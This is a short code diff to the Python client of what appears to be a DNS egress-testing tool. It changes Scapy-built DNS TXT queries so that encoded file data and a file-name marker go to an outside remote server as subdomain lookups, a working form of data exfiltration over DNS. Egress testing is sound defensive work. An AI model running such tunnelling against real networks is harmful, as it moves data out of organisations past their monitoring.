@@ -88,7 +88,7 @@ class Client:
 
                         response_packet = sr1(IP(dst=nameserver)/UDP()/DNS(
                             rd=1, id=15, opcode=0,
-                            qd=[DNSQR(qname=encoded_data, qtype="TXT")], aa=1, qr=0),
+                            qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="TXT")], aa=1, qr=0),
                             verbose=False, timeout=2)
 
                         if response_packet:
@@ -107,9 +107,9 @@ class Client:
             if self.file_transfer is not False:
 
                 while True:
-                    final_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
+                    final_packet = sr1(IP(dst=nameserver)/UDP()/DNS(
                         id=15, opcode=0,
-                        qd=[DNSQR(qname="ENDTHISFILETRANSMISSIONEGRESSASSESS" + self.file_transfer, qtype="A")], aa=1, qr=0),
+                        qd=[DNSQR(qname="file---" + self.file_transfer, qtype="TXT")], aa=1, qr=0),
                         verbose=True, timeout=2)
 
                     if final_packet:
